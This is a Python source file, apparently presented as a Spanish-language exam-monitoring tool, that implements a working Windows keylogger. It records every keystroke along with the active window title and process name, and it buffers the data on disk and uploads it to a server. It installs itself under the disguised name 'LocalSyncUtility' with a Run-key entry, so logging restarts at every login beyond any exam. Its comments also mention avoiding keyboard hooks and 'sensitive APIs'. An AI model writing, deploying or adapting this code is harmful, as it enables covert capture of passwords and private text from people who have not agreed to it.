import ctypes
import glob
import json
import logging
import logging.handlers
import os
import queue
import shutil
import signal
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
import uuid
import winreg
from ctypes import wintypes
from datetime import datetime

# ======================= CONFIGURACIÓN DEL SERVIDOR =======================
# URL del serv
SERVER_URL = "http://localhost:8000/ingest"
# Debe coincidir con INGEST_TOKEN del servidor (docker-compose.yml).
INGEST_TOKEN = "pon-un-token-largo-y-secreto"

#Donde vamos a guardar el exe
CARPETA_DATOS = os.path.join(os.environ["LOCALAPPDATA"], "LocalSyncUtility")
RUTA_LOG = os.path.join(CARPETA_DATOS, "monitor.log")
RUTA_EXE = os.path.join(CARPETA_DATOS, "LocalSyncUtility.exe")

#Ruta para poner que se inicie cada vez que se enciende el ordenador
RUTA_REGISTRO = (
    r"Software\Microsoft\Windows"
    r"\CurrentVersion\Run"
)
NOMBRE_VALOR = "LocalSyncUtility"

# Cada cuánto se manda lo acumulado y cada cuánto se avisa de que seguimos
# vivos.
VOLCADO_SEG = 5
LATIDO_SEG = 1800

# Cada cuanto se hace un sondeo
SONDEO_SEG = 0.015

MAX_PENDIENTES = 600

# Al cerrar, cuánto se espera a que el servidor confirme lo pendiente.
TIMEOUT_ENVIO = 20
TIMEOUT_APAGADO = 4          # margen que da Windows al cerrar sesión
# ==========================================================================

log = logging.getLogger("monitor")

user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
shell32 = ctypes.WinDLL("shell32", use_last_error=True)

HANDLE = wintypes.HANDLE
HWND = wintypes.HWND
HINSTANCE = wintypes.HINSTANCE
HMODULE = HANDLE
HICON = HANDLE
HMENU = HANDLE
LRESULT = ctypes.c_ssize_t
ATOM = wintypes.WORD

# --- Firmas de las ventanas ---
WNDPROC = ctypes.WINFUNCTYPE(LRESULT, HWND, wintypes.UINT,
                             wintypes.WPARAM, wintypes.LPARAM)


class WNDCLASSW(ctypes.Structure):
    _fields_ = [
        ("style", wintypes.UINT),
        ("lpfnWndProc", WNDPROC),
        ("cbClsExtra", ctypes.c_int),
        ("cbWndExtra", ctypes.c_int),
        ("hInstance", HINSTANCE),
        ("hIcon", HICON),
        ("hCursor", ctypes.c_void_p),
        ("hbrBackground", HANDLE),
        ("lpszMenuName", wintypes.LPCWSTR),
        ("lpszClassName", wintypes.LPCWSTR),
    ]


class GUID(ctypes.Structure):
    _fields_ = [
        ("Data1", wintypes.DWORD),
        ("Data2", wintypes.WORD),
        ("Data3", wintypes.WORD),
        ("Data4", ctypes.c_ubyte * 8),
    ]


class NOTIFYICONDATAW(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.DWORD),
        ("hWnd", HWND),
        ("uID", wintypes.UINT),
        ("uFlags", wintypes.UINT),
        ("uCallbackMessage", wintypes.UINT),
        ("hIcon", HICON),
        ("szTip", wintypes.WCHAR * 128),
        ("dwState", wintypes.DWORD),
        ("dwStateMask", wintypes.DWORD),
        ("szInfo", wintypes.WCHAR * 256),
        ("uVersion", wintypes.UINT),
        ("szInfoTitle", wintypes.WCHAR * 64),
        ("dwInfoFlags", wintypes.DWORD),
        ("guidItem", GUID),
        ("hBalloonIcon", HICON),
    ]


# --- Constantes ---
ERROR_ALREADY_EXISTS = 183
ERROR_CLASS_ALREADY_EXISTS = 1410

WNDPROC_ID_AVISO = 1
WNDPROC_ID_REINTENTO = 2

WM_APP = 0x8000
WM_APP_AVISO = WM_APP + 1
WM_TIMER = 0x0113
WM_CLOSE = 0x0010
WM_DESTROY = 0x0002
WM_QUIT = 0x0012
WM_QUERYENDSESSION = 0x0011
WM_ENDSESSION = 0x0016

WS_POPUP = 0x80000000
WS_EX_TOOLWINDOW = 0x00000080
PM_REMOVE = 0x0001

NIM_ADD, NIM_MODIFY, NIM_DELETE = 0, 1, 2
NIF_MESSAGE, NIF_ICON, NIF_TIP, NIF_INFO = 0x00000001, 0x00000002, 0x00000004, 0x00000010
NIIF_INFO = 0x00000001
IDI_INFORMATION = 32516

# --- Firmas de las funciones de la API (importante para Windows de 64 bits) ---
user32.RegisterClassW.argtypes = [ctypes.POINTER(WNDCLASSW)]
user32.RegisterClassW.restype = ATOM
user32.CreateWindowExW.argtypes = [
    wintypes.DWORD, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD,
    ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_int,
    HWND, HMENU, HINSTANCE, ctypes.c_void_p,
]
user32.CreateWindowExW.restype = HWND
user32.DefWindowProcW.argtypes = [HWND, wintypes.UINT,
                                  wintypes.WPARAM, wintypes.LPARAM]
user32.DefWindowProcW.restype = LRESULT
user32.DestroyWindow.argtypes = [HWND]
user32.DestroyWindow.restype = wintypes.BOOL
user32.PeekMessageW.argtypes = [ctypes.POINTER(wintypes.MSG), HWND,
                                wintypes.UINT, wintypes.UINT, wintypes.UINT]
user32.PeekMessageW.restype = wintypes.BOOL
user32.TranslateMessage.argtypes = [ctypes.POINTER(wintypes.MSG)]
user32.DispatchMessageW.argtypes = [ctypes.POINTER(wintypes.MSG)]
user32.DispatchMessageW.restype = LRESULT
user32.PostMessageW.argtypes = [HWND, wintypes.UINT,
                                wintypes.WPARAM, wintypes.LPARAM]
user32.PostMessageW.restype = wintypes.BOOL
user32.SetTimer.argtypes = [HWND, ctypes.c_size_t, wintypes.UINT, ctypes.c_void_p]
user32.SetTimer.restype = ctypes.c_size_t
user32.KillTimer.argtypes = [HWND, ctypes.c_size_t]
user32.KillTimer.restype = wintypes.BOOL
shell32.Shell_NotifyIconW.argtypes = [wintypes.DWORD,
                                      ctypes.POINTER(NOTIFYICONDATAW)]
shell32.Shell_NotifyIconW.restype = wintypes.BOOL
user32.LoadIconW.argtypes = [HINSTANCE, ctypes.c_void_p]
user32.LoadIconW.restype = HICON

user32.GetForegroundWindow.restype = HWND
user32.GetWindowTextLengthW.argtypes = [HWND]
user32.GetWindowTextLengthW.restype = ctypes.c_int
user32.GetWindowTextW.argtypes = [HWND, wintypes.LPWSTR, ctypes.c_int]
user32.GetWindowTextW.restype = ctypes.c_int
user32.GetWindowThreadProcessId.argtypes = [HWND, ctypes.POINTER(wintypes.DWORD)]
user32.GetWindowThreadProcessId.restype = wintypes.DWORD
user32.GetKeyboardLayout.argtypes = [wintypes.DWORD]
user32.GetKeyboardLayout.restype = ctypes.c_void_p
user32.MapVirtualKeyExW.argtypes = [wintypes.UINT, wintypes.UINT, ctypes.c_void_p]
user32.MapVirtualKeyExW.restype = wintypes.UINT
user32.ToUnicodeEx.argtypes = [
    wintypes.UINT, wintypes.UINT, ctypes.POINTER(ctypes.c_ubyte),
    ctypes.POINTER(ctypes.c_wchar), ctypes.c_int, wintypes.UINT, ctypes.c_void_p,
]
user32.ToUnicodeEx.restype = ctypes.c_int
user32.GetAsyncKeyState.argtypes = [ctypes.c_int]
user32.GetAsyncKeyState.restype = ctypes.c_short
user32.GetKeyState.argtypes = [ctypes.c_int]
user32.GetKeyState.restype = ctypes.c_short

kernel32.GetModuleHandleW.argtypes = [wintypes.LPCWSTR]
kernel32.GetModuleHandleW.restype = HMODULE
kernel32.CreateMutexW.argtypes = [ctypes.c_void_p, wintypes.BOOL,
                                  wintypes.LPCWSTR]
kernel32.CreateMutexW.restype = HANDLE
kernel32.CloseHandle.argtypes = [HANDLE]
kernel32.OpenProcess.restype = HANDLE
kernel32.QueryFullProcessImageNameW.argtypes = [
    HANDLE, wintypes.DWORD, wintypes.LPWSTR, ctypes.POINTER(wintypes.DWORD),
]
kernel32.QueryFullProcessImageNameW.restype = wintypes.BOOL

# Códigos de teclas para representarlo despues en texto claro
ESPECIALES = {
    0x08: "⌫", 0x0D: "\n", 0x09: "    ", 0x20: " ",
    0x2E: "⌦", 0x1B: "[Esc]",
    0x25: "[←]", 0x26: "[↑]", 0x27: "[→]", 0x28: "[↓]",
    0x24: "[Inicio]", 0x23: "[Fin]", 0x21: "[RePág]", 0x22: "[AvPág]",
}
# Modificadores y teclas que no se registran como texto
VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL = 0x10, 0x11, 0x12, 0x14
IGNORAR = {
    VK_SHIFT, VK_CONTROL, VK_MENU, VK_CAPITAL,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5,  # L/R shift, ctrl, alt
    0x5B, 0x5C, 0x90, 0x2C,              # Win izq/der, Bloq Num, Impr Pant
}
VK_RANGO = range(0x08, 0xFF)

def preparar_log():
    log.setLevel(logging.INFO)
    log.propagate = False
    for carpeta, nombre in ((CARPETA_DATOS, "monitor.log"),
                            (tempfile.gettempdir(), "monitor_examen.log")):
        try:
            os.makedirs(carpeta, exist_ok=True)
            manejador = logging.handlers.RotatingFileHandler(
                os.path.join(carpeta, nombre),
                maxBytes=1_000_000, backupCount=2, encoding="utf-8")
            manejador.setFormatter(logging.Formatter(
                "%(asctime)s %(levelname)s [%(threadName)s] %(message)s"))
            log.addHandler(manejador)
            return
        except Exception:
            continue


def registrar_fallos():
    def _sin_controlar(tipo, valor, tb):
        log.critical("excepción no controlada", exc_info=(tipo, valor, tb))

    def _sin_controlar_hilo(args):
        log.critical("excepción no controlada en el hilo %s",
                     getattr(args.thread, "name", "?"),
                     exc_info=(args.exc_type, args.exc_value,
                               args.exc_traceback))

    sys.excepthook = _sin_controlar
    threading.excepthook = _sin_controlar_hilo


def instancia_unica():
    h = kernel32.CreateMutexW(None, False, "Local\\MonitorExamen")
    if not h:
        log.error("no se pudo crear el mutex: %s", ctypes.get_last_error())
        return None
    if ctypes.get_last_error() == ERROR_ALREADY_EXISTS:
        kernel32.CloseHandle(h)
        return None
    return h


def copiar_exe():
    # Ruta del ejecutable actual
    ruta_actual = sys.executable

    # Carpeta de destino
    carpeta_destino = CARPETA_DATOS

    os.makedirs(carpeta_destino, exist_ok=True)

    ruta_destino = os.path.join(
        carpeta_destino,
        "LocalSyncUtility.exe"
    )

    # Evitar copiar si ya estamos en el destino
    if os.path.abspath(ruta_actual) != os.path.abspath(ruta_destino):
        shutil.copy2(ruta_actual, ruta_destino)

    return ruta_destino


def agregar_al_inicio():
    if not os.path.isfile(RUTA_EXE):
        log.error("el ejecutable no existe en %s", RUTA_EXE)
        return False

    with winreg.CreateKey(
        winreg.HKEY_CURRENT_USER,
        RUTA_REGISTRO
    ) as clave:
        winreg.SetValueEx(
            clave,
            NOMBRE_VALOR,
            0,
            winreg.REG_SZ,
            f'"{RUTA_EXE}"'
        )

    return True


def comprobar_inicio():
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            RUTA_REGISTRO
        ) as clave:
            valor, _ = winreg.QueryValueEx(clave, NOMBRE_VALOR)

        return valor == f'"{RUTA_EXE}"'

    except FileNotFoundError:
        return False


# ------------------------------ Lectura del teclado ------------------------------

def _down(vk):
    return bool(user32.GetAsyncKeyState(vk) & 0x8000)


def ventana_activa(hwnd):
    largo = user32.GetWindowTextLengthW(hwnd)
    buf = ctypes.create_unicode_buffer(largo + 1)
    user32.GetWindowTextW(hwnd, buf, largo + 1)
    return buf.value or "(sin título)"


def proceso_de_ventana(hwnd):
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    h = kernel32.OpenProcess(0x1000, False, pid)  # QUERY_LIMITED_INFORMATION
    if not h:
        return "?"
    try:
        buf = ctypes.create_unicode_buffer(260)
        size = wintypes.DWORD(260)
        if kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(size)):
            return os.path.basename(buf.value)
        return "?"
    finally:
        kernel32.CloseHandle(h)


def traducir_tecla(vk, ctrl, alt):
    estado = (ctypes.c_ubyte * 256)()
    if _down(VK_SHIFT):
        estado[VK_SHIFT] = 0x80
    if ctrl:
        estado[VK_CONTROL] = 0x80
    if alt:
        estado[VK_MENU] = 0x80
    if user32.GetKeyState(VK_CAPITAL) & 1:
        estado[VK_CAPITAL] = 0x01

    hwnd = user32.GetForegroundWindow()
    hilo = user32.GetWindowThreadProcessId(hwnd, None)
    layout = user32.GetKeyboardLayout(hilo)
    scan = user32.MapVirtualKeyExW(vk, 0, layout)
    buf = (ctypes.c_wchar * 8)()
    n = user32.ToUnicodeEx(vk, scan, estado, buf, len(buf), 0, layout)
    if n > 0:
        return buf[:n]
    return None


def id_equipo():
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"SOFTWARE\Microsoft\Cryptography", 0,
                           winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        valor, _ = winreg.QueryValueEx(k, "MachineGuid")
        if valor:
            return valor
    except Exception:
        pass
    try:
        carpeta = os.path.join(os.environ.get("ProgramData", r"C:\ProgramData"),
                               "MonitorExamen")
        os.makedirs(carpeta, exist_ok=True)
        ruta = os.path.join(carpeta, "pc_id.txt")
        if os.path.isfile(ruta):
            with open(ruta, encoding="utf-8") as f:
                return f.read().strip()
        nuevo = str(uuid.uuid4())
        with open(ruta, "w", encoding="utf-8") as f:
            f.write(nuevo)
        return nuevo
    except Exception:
        return "desconocido"


def nombre_equipo():
    return os.environ.get("COMPUTERNAME") or "sin-nombre"


# ---------------------- Spool de lotes pendientes ----------------------
# Cada lote se guarda en disco ANTES de enviarlo y se borra solo cuando el
# servidor lo confirma. Si el PC se apaga (apagón, "Apagar" con el programa
# abierto, cierre forzado), al reabrir se reenvía lo que quedara. Va en la
# carpeta de temporales: sobrevive a un reinicio normal y no deja rastro fijo.
SPOOL_DIR = os.path.join(tempfile.gettempdir(), "MonitorExamen", "pendientes")


def _spool_ruta(sesion, seq):
    return os.path.join(SPOOL_DIR, f"{sesion}_{seq:06d}.json")


def _spool_guardar(lote):
    """Escribe el lote de forma atómica (.tmp + replace) y devuelve su ruta,
    o None si no se pudo (en ese caso seguimos solo con la cola en memoria)."""
    try:
        os.makedirs(SPOOL_DIR, exist_ok=True)
        ruta = _spool_ruta(lote["sesion"], lote["seq"])
        tmp = ruta + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(lote, f)
        os.replace(tmp, ruta)
        return ruta
    except Exception:
        log.exception("no se pudo guardar el lote %s", lote.get("seq"))
        return None


def _spool_borrar(ruta):
    if ruta:
        try:
            os.remove(ruta)
        except OSError:
            pass


def _post_lote(lote):
    datos = json.dumps(lote).encode("utf-8")
    req = urllib.request.Request(
        SERVER_URL, data=datos,
        headers={"Content-Type": "application/json",
                 "Authorization": f"Bearer {INGEST_TOKEN}"})
    urllib.request.urlopen(req, timeout=10).read()


class Reenviador:
    """Al arrancar, reenvía en segundo plano los lotes que una ejecución
    anterior dejó en el spool (por un apagado brusco) y los borra al confirmar."""

    def __init__(self):
        self.hilo = threading.Thread(target=self._bucle, name="reenvio",
                                     daemon=True)

    def iniciar(self):
        if SERVER_URL:
            self.hilo.start()

    def _bucle(self):
        try:
            for tmp in glob.glob(os.path.join(SPOOL_DIR, "*.tmp")):
                _spool_borrar(tmp)   # restos de una escritura cortada
            archivos = sorted(glob.glob(os.path.join(SPOOL_DIR, "*.json")))
        except Exception:
            log.exception("no se pudo leer el spool")
            return
        if archivos:
            log.info("reenviando %s lote(s) de una ejecución anterior",
                     len(archivos))
        for ruta in archivos:
            try:
                with open(ruta, encoding="utf-8") as f:
                    lote = json.load(f)
            except Exception:
                _spool_borrar(ruta)   # archivo corrupto/incompleto
                continue
            espera = 2
            while True:
                try:
                    _post_lote(lote)
                    break
                except urllib.error.HTTPError as e:
                    if 400 <= e.code < 500:
                        break   # el servidor lo rechaza siempre: no insistir
                    time.sleep(espera)
                    espera = min(espera * 2, 15)
                except Exception:
                    time.sleep(espera)
                    espera = min(espera * 2, 15)
            _spool_borrar(ruta)


class Enviador:
    """Manda los deltas al servidor en un hilo aparte, con cola y reintentos.
    El seq numera los lotes reales de la sesión; el latido va con seq=0 para
    no dejar huecos en la numeración."""

    def __init__(self, sesion):
        self.base = {
            "equipo_id": id_equipo(),
            "equipo_nombre": nombre_equipo(),
            "sesion": sesion,
        }
        self.cola = queue.Queue()
        self.seq = 0
        self._lock = threading.Lock()
        self.pendientes = 0          # lotes aún sin confirmar por el servidor
        self.hilo = threading.Thread(target=self._bucle, name="envio",
                                     daemon=True)
        self.hilo.start()

    def encolar(self, texto, fin=False, latido=False):
        if not texto and not fin and not latido:
            return

        if latido:
            # Solo "sigo vivo": el servidor refresca la hora de actividad y
            # no guarda un lote vacío en el historial.
            lote = dict(self.base, seq=0, texto="", fin=False, latido=True,
                        ts=datetime.now().astimezone().isoformat())
            ruta = None
        else:
            with self._lock:
                self.seq += 1
                seq = self.seq
                lleno = self.pendientes >= MAX_PENDIENTES
            lote = dict(self.base, seq=seq, texto=texto, fin=fin,
                        ts=datetime.now().astimezone().isoformat())
            # Persistido antes de intentar enviarlo, salvo que ya haya
            # demasiados pendientes (para no llenar el disco).
            ruta = None if lleno else _spool_guardar(lote)

        with self._lock:
            self.pendientes += 1
        self.cola.put((lote, ruta))

    def quedan(self):
        with self._lock:
            return self.pendientes

    def cerrar(self):
        """Marca el fin de la cola. El hilo termina cuando ha enviado todo
        lo anterior, así que esperar a que muera equivale a 'todo entregado'."""
        self.cola.put(None)

    def _bucle(self):
        while True:
            item = self.cola.get()
            if item is None:
                return
            lote, ruta = item
            espera = 2
            while True:                      # reintento indefinido: nunca se descarta
                try:
                    _post_lote(lote)
                    break
                except urllib.error.HTTPError as e:
                    if 400 <= e.code < 500:
                        # Token mal, JSON inválido, campo que falta... Reintentar
                        # no arregla nada y bloquearía la cola para siempre.
                        log.error("lote %s rechazado por el servidor (%s): "
                                  "se descarta", lote.get("seq"), e.code)
                        break
                    log.warning("lote %s: HTTP %s, reintento en %ss",
                                lote.get("seq"), e.code, espera)
                    time.sleep(espera)
                    espera = min(espera * 2, 15)
                except Exception as e:
                    log.warning("lote %s: %s, reintento en %ss",
                                lote.get("seq"), e, espera)
                    time.sleep(espera)
                    espera = min(espera * 2, 15)   # espera creciente, tope 15 s
            _spool_borrar(ruta)              # confirmado: ya no hace falta en disco
            with self._lock:
                self.pendientes -= 1


class Monitor:
    """Acumula el texto y lo entrega por lotes. Lo alimenta el sondeo desde
    otro hilo, así que el buffer va con candado."""

    def __init__(self):
        self.buffer = []
        self._lock = threading.Lock()
        self.corriendo = False
        self.clave_ventana = None  # (hwnd, titulo) para detectar cambios
        self.teclas = 0
        self.pulsadas = set()
        self.enviador = None
        self.sesion = None

    def iniciar(self):
        self.sesion = str(uuid.uuid4())
        self.enviador = Enviador(self.sesion)
        self.corriendo = True
        self._anotar("")  # primera cabecera saldrá en la 1ª tecla

    def sondear(self):
        """Lee el teclado con GetAsyncKeyState.

        Se usan los dos bits que devuelve:
          - 0x8000: la tecla está pulsada ahora.
          - 0x0001: se pulsó desde la consulta anterior (lo pone Windows
            precisamente para el sondeo). Así una pulsación rápida que
            empiece y acabe entre dos sondeos no se pierde.
        """
        abajo = set()
        fugaces = set()
        for vk in VK_RANGO:
            estado = user32.GetAsyncKeyState(vk)
            if estado & 0x8000:
                abajo.add(vk)
            elif estado & 0x0001:
                fugaces.add(vk)   # pulsada y soltada entre dos sondeos

        for vk in sorted((abajo | fugaces) - self.pulsadas):
            if vk not in IGNORAR:
                self._registrar(vk)
        self.pulsadas = abajo

    def _anotar(self, texto):
        with self._lock:
            self.buffer.append(texto)

    def _cabecera(self, hwnd, titulo):
        app = proceso_de_ventana(hwnd)
        linea = "─" * 64
        self._anotar(
            f"\n\n{linea}\n"
            f" {datetime.now():%H:%M:%S} · {app} · «{titulo}»\n"
            f"{linea}\n"
        )

    def _registrar(self, vk):
        hwnd = user32.GetForegroundWindow()
        titulo = ventana_activa(hwnd)
        if (hwnd, titulo) != self.clave_ventana:
            self.clave_ventana = (hwnd, titulo)
            self._cabecera(hwnd, titulo)

        ctrl, alt = _down(VK_CONTROL), _down(VK_MENU)
        if vk in ESPECIALES:
            texto = ESPECIALES[vk]
        elif ctrl and not alt:
            # Atajo con Ctrl (Ctrl+C, Ctrl+V...): se anota de forma legible
            letra = traducir_tecla(vk, ctrl=False, alt=False) or f"vk{vk:02X}"
            texto = f"[Ctrl+{letra.upper()}]"
        else:
            car = traducir_tecla(vk, ctrl, alt)
            # si no es imprimible (p. ej. tecla muerta a la espera), se omite
            texto = car if (car and car.isprintable()) else ""

        if texto:
            self._anotar(texto)
        self.teclas += 1

    def volcar(self):
        if not self.corriendo:
            return
        with self._lock:
            if not self.buffer:
                return
            datos = "".join(self.buffer)
            self.buffer.clear()
        if datos and self.enviador:
            self.enviador.encolar(datos)   # el delta va al servidor

    def detener(self):
        self.volcar()
        if self.enviador:
            self.enviador.encolar("", fin=True)   # marca la captura como finalizada
        self.corriendo = False


class Capturista:
    """Lee las teclas en un hilo propio consultando GetAsyncKeyState cada
    15 ms, sin callbacks ni APIs sensibles."""

    def __init__(self, monitor):
        self.monitor = monitor
        self.parar = threading.Event()
        self.hilo = threading.Thread(target=self._bucle, name="captura",
                                     daemon=True)

    def iniciar(self):
        self.hilo.start()

    def join(self, timeout=2):
        if self.hilo.is_alive():
            self.hilo.join(timeout=timeout)

    def _bucle(self):
        log.info("captura por sondeo cada %d ms", round(SONDEO_SEG * 1000))
        while not self.parar.is_set():
            try:
                self.monitor.sondear()
            except Exception:
                log.exception("fallo al sondear")
            # Sin timeBeginPeriod: esperar ~15 ms deja el temporizador del
            # sistema tranquilo (mejor para la batería) y da igual, porque el
            # bit 0x0001 cubre lo que ocurra entre dos sondeos.
            self.parar.wait(SONDEO_SEG)
        log.info("sondeo detenido")


class VentanaOculta:
    """Ventana de 0x0 que nunca se muestra. Sirve para tres cosas:

    - enseñar el globo de aviso al arrancar (Shell_NotifyIcon necesita ventana),
    - enterarse del cierre de sesión / apagado para volcar lo pendiente,
    - atender un cierre ordenado (taskkill sin /F manda WM_CLOSE).

    Es de nivel superior (no message-only) a propósito: las message-only no
    reciben WM_ENDSESSION ni el WM_CLOSE de taskkill."""

    def __init__(self, titulo="Monitor de Examen"):
        self.titulo = titulo
        self.parar = threading.Event()
        self.cierre_sistema = False
        self._id_icono = 1
        self._icono_puesto = False
        self._intentos = 0
        self._texto_aviso = ""
        self._hicono = user32.LoadIconW(None, ctypes.c_void_p(IDI_INFORMATION))
        if not self._hicono:
            self._hicono = user32.LoadIconW(None, ctypes.c_void_p(32512))
        self._proc = WNDPROC(self._wndproc)   # referencia viva

        hinst = kernel32.GetModuleHandleW(None)
        clase = "LocalSyncUtilityWnd"
        wc = WNDCLASSW()
        wc.lpfnWndProc = self._proc
        wc.hInstance = hinst
        wc.lpszClassName = clase
        if not user32.RegisterClassW(ctypes.byref(wc)):
            err = ctypes.get_last_error()
            if err != ERROR_CLASS_ALREADY_EXISTS:
                raise ctypes.WinError(err)

        self.hwnd = user32.CreateWindowExW(
            WS_EX_TOOLWINDOW, clase, clase, WS_POPUP,
            0, 0, 0, 0, None, None, hinst, None)
        if not self.hwnd:
            raise ctypes.WinError(ctypes.get_last_error())

    # ------------------------------ bucle ------------------------------

    def bucle(self):
        """Procesa mensajes hasta que alguien ponga `parar`."""
        msg = wintypes.MSG()
        while not self.parar.is_set():
            if user32.PeekMessageW(ctypes.byref(msg), None, 0, 0, PM_REMOVE):
                if msg.message == WM_QUIT:
                    break
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
            else:
                time.sleep(0.02)

    def avisar(self, titulo, texto):
        self.titulo = titulo
        self._texto_aviso = texto
        user32.PostMessageW(self.hwnd, WM_APP_AVISO, 0, 0)

    def cerrar(self):
        user32.PostMessageW(self.hwnd, WM_CLOSE, 0, 0)

    def destruir(self):
        self._quitar_icono()
        if self.hwnd:
            user32.DestroyWindow(self.hwnd)
            self.hwnd = None

    # ------------------------------ icono ------------------------------

    def _base_icono(self):
        nid = NOTIFYICONDATAW()
        nid.cbSize = ctypes.sizeof(NOTIFYICONDATAW)
        nid.hWnd = self.hwnd
        nid.uID = self._id_icono
        return nid

    def _poner_icono(self):
        """Añade el icono temporal. Devuelve False si el shell no lo acepta."""
        nid = self._base_icono()
        nid.uFlags = NIF_ICON | NIF_TIP
        nid.hIcon = self._hicono
        nid.szTip = self.titulo[:120]
        if shell32.Shell_NotifyIconW(NIM_ADD, ctypes.byref(nid)):
            self._icono_puesto = True
            return True

        # Puede ser un icono huérfano de un cierre brusco anterior: se
        # limpia y se reintenta una vez.
        shell32.Shell_NotifyIconW(NIM_DELETE, ctypes.byref(nid))
        if shell32.Shell_NotifyIconW(NIM_ADD, ctypes.byref(nid)):
            self._icono_puesto = True
            return True
        return False

    def _quitar_icono(self):
        if not self._icono_puesto or not self.hwnd:
            return
        nid = self._base_icono()
        shell32.Shell_NotifyIconW(NIM_DELETE, ctypes.byref(nid))
        self._icono_puesto = False

    def _mostrar_aviso(self):
        if not self.hwnd:
            return
        if not self._icono_puesto and not self._poner_icono():
            # Arrancando con Windows el área de notificación puede no estar
            # lista todavía: se reintenta cada segundo (20 intentos).
            if self._intentos < 20:
                self._intentos += 1
                user32.SetTimer(self.hwnd, WNDPROC_ID_REINTENTO, 1000, None)
            else:
                log.error("el shell rechaza el icono: no se pudo mostrar el "
                          "aviso de captura")
            return

        self._intentos = 0
        nid = self._base_icono()
        nid.uFlags = NIF_INFO
        nid.szInfoTitle = self.titulo[:60]
        nid.szInfo = self._texto_aviso[:250]
        nid.dwInfoFlags = NIIF_INFO
        shell32.Shell_NotifyIconW(NIM_MODIFY, ctypes.byref(nid))
        # El globo se va solo; el icono lo retiramos nosotros.
        user32.SetTimer(self.hwnd, WNDPROC_ID_AVISO, 10000, None)

    # ------------------------------ wndproc ------------------------------

    def _wndproc(self, hwnd, msg, wparam, lparam):
        try:
            if msg == WM_APP_AVISO:
                self._mostrar_aviso()
                return 0

            if msg == WM_TIMER and wparam == WNDPROC_ID_AVISO:
                user32.KillTimer(hwnd, WNDPROC_ID_AVISO)
                self._quitar_icono()
                return 0

            if msg == WM_TIMER and wparam == WNDPROC_ID_REINTENTO:
                user32.KillTimer(hwnd, WNDPROC_ID_REINTENTO)
                self._mostrar_aviso()
                return 0

            if msg == WM_QUERYENDSESSION:
                self.cierre_sistema = True
                return 1   # TRUE: no bloquear el apagado

            if msg == WM_ENDSESSION:
                if wparam:
                    self.cierre_sistema = True
                    self.parar.set()
                return 0

            if msg == WM_CLOSE:
                log.info("cierre solicitado (WM_CLOSE)")
                self.parar.set()
                return 0

            if msg == WM_DESTROY:
                self.parar.set()
                return 0
        except Exception:
            log.exception("fallo en el procedimiento de ventana")
        return user32.DefWindowProcW(hwnd, msg, wparam, lparam)


class Servicio:
    """Junta captura, volcado periódico y latido."""

    def __init__(self):
        self.parar = threading.Event()
        self.monitor = Monitor()
        self.capturista = Capturista(self.monitor)
        self._volcador = threading.Thread(target=self._bucle_volcado,
                                          name="volcado", daemon=True)
        self._latido = threading.Thread(target=self._bucle_latido,
                                        name="latido", daemon=True)
        self._lock = threading.Lock()
        self._detenido = False

    def arrancar(self):
        Reenviador().iniciar()   # reenvía lo de un apagado brusco anterior
        self.monitor.iniciar()
        self.capturista.iniciar()
        self._volcador.start()
        self._latido.start()
        log.info("captura iniciada (sesión %s)", self.monitor.sesion)

    def _bucle_volcado(self):
        while not self.parar.wait(VOLCADO_SEG):
            try:
                self.monitor.volcar()
            except Exception:
                log.exception("fallo al volcar")

    def _bucle_latido(self):
        while not self.parar.wait(LATIDO_SEG):
            try:
                if self.monitor.enviador:
                    self.monitor.enviador.encolar("", latido=True)
            except Exception:
                log.exception("fallo al mandar el latido")

    def detener(self, timeout=TIMEOUT_ENVIO):
        with self._lock:
            if self._detenido:
                return
            self._detenido = True

        log.info("deteniendo captura")
        self.parar.set()
        self.capturista.parar.set()
        # Primero se paran los que escriben (captura y volcador): así el "fin"
        # sale con el último seq y no hay dos hilos numerando a la vez.
        self.capturista.join(timeout=2)
        if self._volcador.is_alive():
            self._volcador.join(timeout=VOLCADO_SEG + 2)
        if self._latido.is_alive():
            self._latido.join(timeout=2)

        self.monitor.detener()

        env = self.monitor.enviador
        if not env:
            return
        t0 = time.time()
        while env.quedan() and time.time() - t0 < timeout:
            time.sleep(0.25)
        env.cerrar()
        if env.hilo.is_alive():
            env.hilo.join(timeout=2)

        pendientes = env.quedan()
        if pendientes:
            log.warning("quedan %s lote(s) sin confirmar: el spool los "
                        "reenviará al arrancar", pendientes)
        else:
            log.info("todo enviado")


def main():
    preparar_log()
    registrar_fallos()
    log.info("arrancando (pid %s)", os.getpid())

    mutex = instancia_unica()
    if mutex is None:
        log.warning("ya hay una instancia en marcha: se sale sin capturar")
        return 0

    if not SERVER_URL:
        log.error("SERVER_URL está vacío: no se captura nada. "
                  "Revisa la configuración y avisa al profesor.")
        return 2

    if getattr(sys, "frozen", False):
        # Con el .py suelto sys.executable sería Python: solo tiene sentido
        # cuando corre el ejecutable compilado.
        try:
            copiar_exe()
            agregar_al_inicio()
        except Exception:
            log.exception("no se pudo dejar la copia de arranque")

    ventana = VentanaOculta()
    servicio = Servicio()

    def _senal(signum, _frame):
        log.info("señal %s: cerrando", signum)
        ventana.cerrar()

    try:
        signal.signal(signal.SIGINT, _senal)
        signal.signal(signal.SIGTERM, _senal)
    except Exception:
        pass   # sin consola no hay señales que atender

    servicio.arrancar()
    # Aviso visible: obligatorio, y además deja rastro en el log.
    ventana.avisar(
        "Monitor de Examen",
        "Este equipo registra el teclado durante el examen.",
    )
    log.info("aviso mostrado al usuario")

    try:
        ventana.bucle()
    except KeyboardInterrupt:
        pass
    finally:
        try:
            servicio.detener(
                timeout=TIMEOUT_APAGADO if ventana.cierre_sistema
                else TIMEOUT_ENVIO)
        finally:
            ventana.destruir()
            log.info("fin")

    return 0


if __name__ == "__main__":
    sys.exit(main())
